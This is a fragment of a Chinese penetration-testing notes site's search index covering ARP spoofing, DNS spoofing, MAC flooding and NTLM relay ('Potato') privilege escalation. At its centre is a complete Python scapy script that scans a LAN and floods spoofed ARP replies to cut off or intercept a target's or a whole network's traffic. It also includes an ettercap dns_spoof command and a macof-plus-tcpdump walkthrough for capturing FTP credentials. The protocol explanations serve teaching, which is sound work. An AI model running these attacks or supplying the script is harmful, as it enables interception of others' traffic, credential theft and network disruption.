0\u636e\u5305\u7684\u7f16\u5199 \u8bb2\u8bb2\u91cc\u9762\u7684\u4e00\u4e9b\u51fd\u6570(\u6ca1\u6709\u7ee7\u7eed\u7814\u7a76scapy\u5e93) get_if_hwaddr('\u7f51\u5361\u540d') //\u83b7\u5f97\u81ea\u5df1\u7684mac\u5730\u5740\uff0c\u4e00\u822c\u586bWLAN\u6216eth0 getmacbyip('ip) //\u83b7\u5f97\u67d0IP\u7684mac\u5730\u5740 srp(....) //\u53d1\u7b2c\u4e8c\u5c42\u5305\u5e76\u8fd4\u7b49\u5f85\u56de\u5e94\uff0c\u8fd4\u56de\u503c\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u56de\u5e94\u5305\u4f53\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u672a\u56de\u5e94\u5305\u4f53 sendp(Ether(src=a,dst=b)/ARP(hwsrc=c,psrc=d,pdst=e,op=f)) //\u8fd9\u662farp\u53d1\u5305\u7684\u6784\u9020 sendp\u662f\u53d1\u7b2c\u4e8c\u5c42\u6570\u636e\u5305\u5e76\u4e0d\u7b49\u5f85\u56de\u5305 Ether\u662f\u6784\u9020\u5305\u4f53\u7684\u610f\u601d //a\u4e3a\u81ea\u5df1\u7684mac\u5730\u5740 b\u4e3a\u76ee\u6807\u673a\u5668\u7684mac\u5730\u5740\uff0c //c\u4e3a\u53d1\u5305\u7684\u6765\u6e90mac\uff0cd\u4e3a\u53d1\u5305\u7684\u6765\u6e90ip\uff0ce\u662f\u76ee\u6807\u673a\u5668\u7684ip\uff0cf\u662farp\u64cd\u4f5c\u7c7b\u578b\u5b57\u7b26 //arp\u6b3a\u9a97\u7684\u8bdd\uff0c\u628ad\u6539\u6210\u7f51\u5173IP\u5373\u53ef \u7f51\u4e0a\u5ad6\u7684ip\uff0cmac\u626b\u63cf\u6a21\u5757\uff0c\u8fd9\u4e00\u6b65\u4e5f\u53ef\u4ee5\u624b\u52a8\u83b7\u53d6 from scapy.all import * ##im_scan('192.168.1.1/24'),mac ip\u5730\u5740\u626b\u63cf\u51fd\u6570 def im_scan(ipduan): ipscan=ipduan try: ans,unans = srp(Ether(dst=\"FF:FF:FF:FF:FF:FF\")/ARP(pdst=ipscan),timeout=2,verbose=False) except Exception as e: print (str(e)) else: for snd,rcv in ans: list_mac=rcv.sprintf(\"%Ether.src% - %ARP.psrc%\") print (list_mac) \u8fd9\u4e2a\u811a\u672c\u4ec5\u80fd\u65ad\u7f51\u55f7,\u53ef\u4ee5\u5bf9\u5355\u4e2a\u673a\u5668\u65ad\u7f51\uff0c\u4e5f\u53ef\u4ee5\u65ad\u6574\u4e2a\u5c40\u57df\u7f51\u7684\u7f51 from scapy.all import * import time import threading def im_scan(ipduan):#\u626b\u63cf ipscan=ipduan try: ans,unans = srp(Ether(dst=\"FF:FF:FF:FF:FF:FF\")/ARP(pdst=ipscan),timeout=2,verbose=False) except Exception as e: print (str(e)) else: for snd,rcv in ans: list_mac=rcv.sprintf(\"%Ether.src% - %ARP.psrc%\") print (list_mac) def arp_spoof(tgt_ip,gateway_ip,iface): mmac=get_if_hwaddr(iface) tgt_mac=getmacbyip(tgt_ip) if tgt_ip: while 1: sendp(Ether(src=mmac,dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mmac,psrc=gateway_ip,pdst=tgt_ip,op=2)) else: while 1: sendp(Ether(src=mmac,dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mmac,psrc=gateway_ip,op=2)) def arp_gate(tgt_ip,gateway_ip,iface): mmac=get_if_hwaddr(iface) tgt_mac=getmacbyip(tgt_ip) while 1: sendp(Ether(dst=gateway_mac,src=mmac)/ARP(hwsrc=mmac,psrc=tgt_ip,pdst=gateway_ip,op=2)) if __name__=='__main__': ipduan='192.168.0.0/24' tgt_ip='192.168.0.104' #\u8981\u6253\u6574\u4e2a\u5c40\u57df\u7f51\u5c31\u522b\u8bbe\u7f6e\u8fd9\u4e2a\uff0c\u8981\u622a\u83b7\u5916\u754c\u53d1\u5f80\u673a\u5668\u7684\u6570\u636e\u8fd9\u4e2a\u4e5f\u5fc5\u987b\u8bbe\u7f6e gateway_ip='192.168.0.1' iface='WLAN' threads_num=20 print(\"\u5982\u679c\u60f3\u641e\u6574\u4e2a\u5c40\u57df\u7f51\u5c31\u522b\u8bbe\u7f6etgt_ip,\u8981\u622a\u83b7\u5916\u754c\u53d1\u5f80\u673a\u5668\u7684\u6570\u636e\u8fd9\u4e2a\u5fc5\u987b\u8bbe\u7f6e\") so_scan=input(\"[+]\u8981\u626b\u63cf\u5c40\u57df\u7f51\u5b58\u6d3b\u4e3b\u673a\u548c\u5b83\u7684mac\u5417[Y/N]\") if so_scan=='Y': im_scan(ipduan) else: so_judge=input(\"[+]\u4f60\u662f\u60f3\u8ba9\u673a\u5668\u7684\u53d1\u9001\u7684\u6570\u636e\u88ab\u4f60\u622a\u83b7Y\uff0c\u8fd8\u662f\u5916\u754c\u53d1\u9001\u7ed9\u673a\u5668\u7684\u6570\u636e\u88ab\u4f60\u622a\u83b7N[Y/N]\") if so_judge=='Y': try: print('\u5f00\u59cb\u622a\u80e1\u673a\u5668\u53d1\u9001\u5f80\u5916\u754c\u7684\u6570\u636e') time.sleep(3) for i in range(threads_num): t1=threading.Thread(target=arp_spoof,args=(tgt_ip,gateway_ip,iface),name=str(i)) t1.start() except KeyboardInterrupt: print('[+]stopppppppp') else: if tgt_ip: try: print('\u5f00\u59cb\u622a\u80e1\u5916\u754c\u53d1\u5f80\u673a\u5668\u7684\u6570\u636e') time.sleep(3) for i in range(threads_num): t2=threading.Thread(target=arp_gate,args=(tgt_ip,gateway_ip,iface),name=str(i)) t2.start() except KeyboardInterrupt: print('[+]stopppppppp') else: print('\u8bf7\u8bbe\u7f6etgt_ip') \u5e7f\u64ad\u6b3a\u9a97\uff0c\u53d7\u5bb3\u673a\u4e0a\u7684\u6293\u5305\u6548\u679c 3c\u90a3\u4e2a\u662f\u6211\u7684mac\u5730\u5740","title":"arp\u653b\u51fb\u7684\u811a\u672c\u7f16\u5199\uff1a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#dns","text":"","title":"DNS\u6b3a\u9a97"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#dns_1","text":"dns\uff08\u57df\u540d\u7cfb\u7edf\uff09\u5c06\u57df\u540d\u548cIP\u5730\u5740\u76f8\u4e92\u6620\u5c04\uff0cdns\u534f\u8bae\u5373\u57df\u540d\u89e3\u6790\u534f\u8bae\uff0c\u7528\u6765\u5c06\u7528\u6237\u8f93\u5165\u7684\u57df\u540d\u89e3\u6790\u4e3aIP\u3002 \u5177\u4f53\u4e00\u70b9\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u67d0\u4e2a\u57df\u540d\u5982 www.baidu.com \u65f6\uff0c \u9996\u5148\u5411\u672c\u5730dns\u53d1\u51fa\u8bf7\u6c42 \u82e5\u672c\u5730dns\u7f13\u5b58\u8868\u65e0\u8be5\u57df\u540dIP\u6620\u5c04\u5173\u7cfb\uff0c\u5c31\u4f1a\u5411\u6839\u57df\u540d\u670d\u52a1\u5668\u53d1\u8d77\u67e5\u8be2\uff0c\u6839\u57df\u540d\u670d\u52a1\u5668\u8fd4\u56decom\u57df\u670d\u52a1\u5668\u5730\u5740\u7ed9\u672c\u5730dns\u670d\u52a1\u5668 \u672c\u5730dns\u670d\u52a1\u5668\u5411com\u57df\u670d\u52a1\u5668\u53d1\u8d77\u67e5\u8be2\uff0ccom\u57df\u670d\u52a1\u5668\u8fd4\u56debaidu.com\u57df\u670d\u52a1\u5668\u7ed9\u672c\u5730dns\u670d\u52a1\u5668 \u672c\u5730dns\u670d\u52a1\u5668\u5411baidu.com\u57df\u670d\u52a1\u5668\u53d1\u8d77\u67e5\u8be2\uff0cbaidu.com\u57df\u670d\u52a1\u5668\u8fd4\u56de www.baidu.com \u5730\u5740","title":"dns\u5de5\u4f5c\u539f\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#dns_2","text":"\u5728arp\u6b3a\u9a97\u540e\u83b7\u53d6\u5230\u4e86\u53d7\u5bb3\u673a\u53d1\u8d77\u7684dns\u8bf7\u6c42\u5305\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u81ea\u5df1\u6784\u9020\u7684dns\u54cd\u5e94\u5305\uff0c\u4f2a\u9020\u81ea\u5df1\u60f3\u8981\u7684ip\u57df\u540d\u6620\u5c04\u5173\u7cfb\u3002 \u56e0\u4e3aDNS\u6b3a\u9a97\u662f\u5efa\u7acb\u5728arp\u6b3a\u9a97\u57fa\u7840\u4e0a\uff0carp\u6b3a\u9a97\u53c8\u5fc5\u987b\u5728\u5c40\u57df\u7f51\u8fdb\u884c\uff0c\u6545DNS\u6b3a\u9a97\u4e5f\u53ea\u80fd\u5728\u5c40\u57df\u7f51\u8fdb\u884c","title":"DNS\u6b3a\u9a97\u539f\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#dns_3","text":"ettercap -T -q -P dns_spoof -M arp:remote /\u53d7\u5bb3\u8005IP///","title":"DNS\u6b3a\u9a97\u5de5\u5177\u5b9e\u73b0"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#mac","text":"","title":"mac\u6cdb\u6d2a\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#_5","text":"\u4ea4\u6362\u673a\uff0c\u53ea\u80fd\u505a\u6709\u7ebf\u94fe\u63a5\uff0c\u6240\u4ee5\u62ff\u8fd9\u4e2a\u662f\u4e0d\u80fd\u7528\u4f5cwifi\u7684\u3002 \u4ea4\u6362\u673a\u7684\u4f5c\u7528\u662f\u8f6c\u53d1\u5c40\u57df\u7f51\u5185\u4e24\u53f0\u673a\u5668\u4e4b\u95f4\u7684\u4e92\u76f8\u7684\u8bf7\u6c42\uff08\u6709\u7ebf\u8fde\u63a5\u7684\u673a\u5668\uff09\u3002 \u4ea4\u6362\u673a\u5177\u4f53\u4f20\u8f93\u6570\u636e\u5e27\u7684\u8fc7\u7a0b\uff1a \u5047\u8bbe\u4e3b\u673aA\u7b2c\u4e00\u6b21\u5411\u4e3b\u673aB\u53d1\u9001\u6570\u636e \u4e3b\u673aA\u5411\u4ea4\u6362\u673a\u53d1\u8d77\u4e00\u4e2a\u6e90mac\u5730\u5740\u4e3a\u81ea\u5df1\uff0c\u76ee\u6807mac\u5730\u5740\u4e3a\u4e3b\u673aB\u7684\u6570\u636e\u5e27 \u4ea4\u6362\u673a\u6536\u5230\u540e\uff0c\u5c06\u6e90mac\u5730\u5740\u548c\u5176\u5bf9\u5e94\u63a5\u53e3\u8bb0\u5f55\u5230mac\u5730\u5740\u8868\u4e2d\uff08mac\u5730\u5740\u8868\u4e0earp\u7f13\u5b58\u8868\u6709\u533a\u522b\uff09 \u4ea4\u6362\u673a\u5728\u81ea\u5df1\u7684mac\u5730\u5740\u8868\u4e2d\u68c0\u67e5\u662f\u5426\u6709\u76ee\u6807mac\u7684\u4fe1\u606f\uff0c\u5982\u679c\u6709\u5219\u5411\u76ee\u6807mac\u63a5\u53e3\u8f6c\u53d1\u6570\u636e\u5e27\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u5c31\u4f1a\u5411\u6240\u4ee5\u975e\u6570\u636e\u6765\u6e90\u63a5\u53e3\u7684\u63a5\u53e3\u5e7f\u64ad\u8be5\u6570\u636e\u5e27\uff08mac\u6cdb\u6d2a\u653b\u51fb\u539f\u7406\uff09 \u5c40\u57df\u7f51\u5185\u4e3b\u673a\u90fd\u6536\u5230\u4e86\u6b64\u6570\u636e\u5e27\uff0c\u4f46\u53ea\u6709\u4e3b\u673aB\u4f1a\u54cd\u5e94\u8be5\u6570\u636e\u5e27\u5e76\u4e14\u56de\u5e94\uff0c\u56de\u5e94\u4fe1\u606f\u91cc\u6ce8\u660e\u4e3b\u673aB\u7684mac\u5730\u5740\u4ee5\u4fbf\u8bb0\u5f55\u5230mac\u5730\u5740\u8868\uff0c\u5176\u4ed6\u4e3b\u673a\u90fd\u4e0d\u4f1a\u6709\u53cd\u5e94\u3002 \u4ea4\u6362\u673a\u63a5\u6536\u5230\u4e3b\u673aB\u7684\u56de\u5e94\u540e\uff0c\u4f1a\u8bb0\u5f55\u5176mac \u63a5\u53e3\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u4ee5\u540eAB\u901a\u4fe1\u65f6\u4f1a\u8c03\u7528mac\u5730\u5740\u8868\u4e2d\u7684\u8bb0\u5f55\uff0c\u5b9e\u73b0\u5355\u64ad","title":"\u4ea4\u6362\u673a:"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#macarp","text":"mac\u8868\u8bb0\u5f55\u5728\u4ea4\u6362\u673a\u4e2d\uff0c\u7528\u4e8e\u8bb0\u5f55\u63a5\u53e3 mac\u5730\u5740\u7684\u5bf9\u5e94\u5173\u7cfb arp\u7f13\u5b58\u8868\u8bb0\u5f55\u5728\u672c\u673a\u4e2d\uff0c\u7528\u4e8e\u8bb0\u5f55IP mac\u5730\u5740\u7684\u5bf9\u5e94\u5173\u7cfb","title":"mac\u8868\u4e0earp\u7f13\u5b58\u8868\u7684\u533a\u522b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#mac_1","text":"mac\u8868\u4e00\u822c\u90fd\u662f\u6709\u5927\u5c0f\u9650\u5236\u7684\uff0c\u4e00\u65e6mac\u8868\u6ee1\u4e86\uff0c\u5176\u4ed6mac\u5730\u5740\u5c31\u52a0\u4e0d\u8fdb\u6765\u4e86\u3002 \u4e00\u65e6\u5176\u4ed6mac\u5730\u5740\u52a0\u4e0d\u8fdb\u6765\u4e86\uff0c\u90a3\u4e48mac\u8868\u5c31\u65e0\u6cd5\u8fdb\u4e00\u6b65\u5b66\u4e60\uff0c\u4e4b\u540e\u7684\u6240\u6709\u8bf7\u6c42\u90fd\u4f1a\u88ab\u5e7f\u64ad\u5230\u5c40\u57df\u7f51\uff0c\u5b9e\u73b0\u6cdb\u6d2a\u3002 mac\u8868\u662f\u6709\u8001\u5316\u673a\u5236\u7684\uff0c\u82e5\u4ea4\u6362\u673a\u4e0e\u67d0\u53f0\u4e3b\u673a\u957f\u65f6\u95f4\u672a\u901a\u4fe1\uff0c\u4ea4\u6362\u673a\u5c31\u4f1a\u628a\u8be5\u4e3b\u673a\u7684mac\u5730\u5740\u5220\u9664\uff0c\u7b49\u4e0b\u4e00\u6b21\u901a\u4fe1\u65f6\u518d\u5b66\u4e60\u3002","title":"\u4ea4\u6362\u673amac\u8868\u7684\u5b66\u4e60\u673a\u5236\uff1a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#_6","text":"\u6cdb\u6d2a\u653b\u51fb\u7684\u76ee\u7684\u662f\u83b7\u53d6\u4e3b\u673a\u4e4b\u95f4\u7684\u901a\u4fe1\u6570\u636e\uff0c\u8981\u8fbe\u5230\u8fd9\u4e2a\u76ee\u7684\u5219\u9700\u8981\u5f3a\u8feb\u4ea4\u6362\u673a\u628a\u63a5\u6536\u5230\u7684\u6570\u636e\u5e27\u7edf\u7edf\u5e7f\u64ad\u51fa\u6765\u3002\u6cdb\u6d2a\u653b\u51fb\u539f\u7406\u5219\u662f\u5411\u4ea4\u6362\u673a\u53d1\u9001\u5927\u91cf\u672a\u77e5mac\u5730\u5740\u8ba9\u4ea4\u6362\u673a\u4e0d\u505c\u5b66\u4e60\uff0c\u628amac\u8868\u5145\u6ee1\uff0c\u8fd9\u6837\u6b63\u5e38\u4e3b\u673amac\u5730\u5740\u8001\u5316\u540e\u5c31\u65e0\u6cd5\u518d\u6dfb\u52a0\u5230mac\u5730\u5740\u8868\u4e2d\uff0c\u4ee5\u540e\u7684\u6240\u6709\u901a\u4fe1\u6570\u636e\u90fd\u4f1a\u88ab\u5e7f\u64ad\u51fa\u6765","title":"\u6cdb\u6d2a\u653b\u51fb\u539f\u7406\uff1a"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#kalimacof","text":"\u76ee\u524d\u6709\u4e09\u53f0\u673a\u5668 \u6211\u4eec\u8bd5\u7740\u622a\u83b7\u7269\u7406\u673a\u767b\u5f55ftp\u670d\u52a1\u5668\u65f6\u7684\u8d26\u6237\u4e0e\u5bc6\u7801 \u5148\u4f7f\u7528\u547d\u4ee4macof\uff0c\u8ba9\u4ea4\u6362\u673a\u7684mac\u8868\u88ab\u5360\u6ee1 \u4ec5\u8f93\u5165macof\u5373\u53ef \u8f93\u5165tcpdump -nn -X -i eth0 tcp port 21\u5f00\u59cb\u6293\u5305\uff08\u5efa\u8bae\u4e0d\u7528wireshark\uff0c\u662f\u56e0\u4e3a\u540c\u4e00\u65f6\u95f4macof\u547d\u4ee4\u53d1\u51fa\u7684\u6570\u636e\u5305\u592a\u591a\u4e86\uff0c\u7528wireshark\u4f1a\u5de8\u5361\uff09 \u4e0b\u9762\u662f\u6293http\u5305","title":"\u4f7f\u7528kali\u4e0a\u7684macof\u6765\u8fdb\u884c\u6cdb\u6d2a\u653b\u51fb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/ARP%E6%AC%BA%E9%AA%97%26DNS%E6%AC%BA%E9%AA%97%26mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/#mac_2","text":"\u53ea\u80fd\u5728\u5c40\u57df\u7f51\u5185\u653b\u51fb\u53e6\u4e00\u4e2a\u5c40\u57df\u7f51\u5185\u673a\u5668. \u4e14\u653b\u51fb\u76ee\u6807\u5fc5\u987b\u548c\u81ea\u5df1\u7528\u4ea4\u6362\u673a\u6709\u7ebf\u8fde\u63a5\u8d77\u6765 \u4e5f\u5c31\u662f\u8bf4\u4f60\u7684\u7535\u8111\u53d1\u8d77mac\u6cdb\u6d2a\u662f\u653b\u51fb\u4e0d\u5230\u4f60\u7684\u624b\u673a\u7684\u3002","title":"mac\u6cdb\u6d2a\u653b\u51fb\u7684\u5c40\u9650\u6027:"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/","text":"NTLM Relay\u53ca\u76f8\u5173\u539f\u7406 \u76ee\u5f55 \u7b51\u57fa \u571f\u8c46 Origin Potato_MS08-068 (\u571f\u8c46\u59cb\u7956\u6f0f\u6d1e) Hot Potato Rotten Potato Juicy Potato Rogue Potato \u7b51\u57fa \u571f\u8c46 Origin Potato_MS08-068 (\u571f\u8c46\u59cb\u7956\u6f0f\u6d1e) \u672c\u5730smb\u2192smb \u4fee\u590d\u65b9\u6848\uff1a \u4e3b\u673a A \u5411\u4e3b\u673a B(\u8bbf\u95ee \\B ) \u8fdb\u884c SMB \u8ba4\u8bc1\u7684\u65f6\u5019\uff0c\u5c06 pszTargetName \u8bbe\u7f6e\u4e3a cifs/B , \u7136\u540e\u5728 type 2 \u62ff\u5230\u4e3b\u673a B \u53d1\u9001 Challenge \u4e4b\u540e\uff0c\u5728 lsass \u91cc\u9762\u7f13\u5b58 ( Challenge ,cifs/B)\u3002 \u7136\u540e\u4e3b\u673a B \u5728\u62ff\u5230\u4e3b\u673a A \u7684 type 3 \u4e4b\u540e\uff0c\u4f1a\u53bb\u67e5\u770b lsass \u91cc\u9762\u6709\u6ca1\u6709\u7f13\u5b58 ( Challenge , cifs/b )\uff0c\u5982\u679c\u5b58\u5728\u7f13\u5b58\uff0c\u90a3\u4e48\u8ba4\u8bc1\u5931\u8d25\u3002 \u8fd9\u79cd\u60c5\u51b5\u5e95\u4e0b\uff0c\u5982\u679c\u4e3b\u673a B \u548c\u4e3b\u673a A \u662f\u4e0d\u540c\u7684\u4e3b\u673a\u7684\u8bdd\uff0c\u90a3 lsass \u91cc\u9762\u5c31\u4e0d\u4f1a\u7f13\u5b58 ( Challenge , cifs/B )\u3002\u5982\u679c\u662f\u540c\u4e00\u53f0\u4e3b\u673a\u7684\u8bdd\uff0c\u90a3 lsass \u91cc\u9762\u80af\u5b9a\u6709\u7f13\u5b58\uff0c\u8fd9\u4e2a\u65f6\u5019\u5c31\u4f1a\u8ba4\u8bc1\u5931\u8d25\u3002 \u7b80\u800c\u8a00\u4e4b\uff1a\u4e3b\u673a\u6536\u5230chanllage\uff08type 2\uff09\u540e\u4f1a\u5728\u672c\u5730\u5bf9\u5176\u8fdb\u884c\u4e00\u4e2a\u7f13\u5b58\u8bb0\u5f55\uff0c\u5728\u6536\u5230type 3\u540e\u4f1a\u6821\u9a8c\u672c\u5730\u662f\u5426\u6709type 2\u5bf9\u5e94\u7684\u8bb0\u5f55\u3002\u5982\u679c\u6709\u8bb0\u5f55\uff0c\u5c31\u8bf4\u660e\u662f\u672c\u5730smb\u5230smb\u7684Relay\uff0c\u8fd4\u56de\u6821\u9a8c\u5931\u8d25\u3002 Hot Potato \u5229\u7528windows update\uff0c\u5b9e\u73b0http\u5230smb\u7684relay \u600e\u4e48\u53d1\u8d77ntlm\u8bf7\u6c42 \u53d1\u8d77ntlm\u8bf7\u6c42\u8bf7\u6c42\u7684\u65b9\u5f0f: \u914d\u5408NBNS\u6295\u6bd2\u6b3a\u9a97\u548c\u4f2a\u9020WPAD\u4ee3\u7406\u670d\u52a1\u5668\u62ff\u5230\u7528\u6237\u7684 Net-NTML hash \uff0c\u6240\u6709\u7684HTTP\u8bf7\u6c42\u5c06\u4f1a\u88ab\u91cd\u5b9a\u5411\u81f3 \" http://localhost/GETHASHESxxxxx \" \uff0c\u5176\u4e2d\u7684xxxxx\u8868\u793a\u7684\u662f\u67d0\u4e9b\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u5c06\u4f1a\u5f71\u54cd\u76ee\u6807\u4e3b\u673a\u4e2d\u6240\u6709\u7684\u7528\u6237\uff0c\u5305\u62ec\u7ba1\u7406\u5458\u8d26\u6237\u548c\u7cfb\u7edf\u8d26\u6237 2. \u62ff\u5230ntlm \u8bf7\u6c42\u4e4b\u540e\u8981\u505a\u4ec0\u4e48 MS08-068\u867d\u7136\u9650\u5236\u4e86\u540c\u53f0\u4e3b\u673a\u4e4b\u95f4smb\u5230smb\u7684Relay\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u9650\u5236\u4ecehttp\u5230smb\uff0c\u6211\u4eec\u914d\u7f6e\u914d\u5408NBNS\u6295\u6bd2\u6b3a\u9a97\u548c\u4f2a\u9020WPAD\u4ee3\u7406\u670d\u52a1\u5668\u62ff\u5230\u7684ntlm\u8bf7\u6c42\u8bf4http\u7684\u5f62\u5f0f\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5relay \u5230\u672c\u673a\u7684smb\u3002 3. \u670d\u52a1\u7aef\u662f\u5426\u8981\u6c42\u7b7e\u540d \u6211\u4eecRelay\u5230\u7684\u670d\u52a1\u7aef\u534f\u8bae\u662fsmb\uff0c\u9664\u975e\u662f\u57df\u5185\u7684\u57df\u63a7\uff0c\u4e0d\u7136\u5728\u5de5\u4f5c\u7ec4\u73af\u8282\u5e95\u4e0b\uff0c\u6216\u8005\u57df\u5185\u7684\u57df\u6210\u5458\u673a\u5668\uff0c\u90fd\u662f\u4e0d\u8981\u6c42\u7b7e\u540d\u7684\u3002 \u4fee\u590d\uff1a MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). WAPD MITM Attack is patched. Rotten Potato \u7b80\u800c\u8a00\u4e4b\uff1a\u662f\u4e2a\u63d0\u6743\u3002 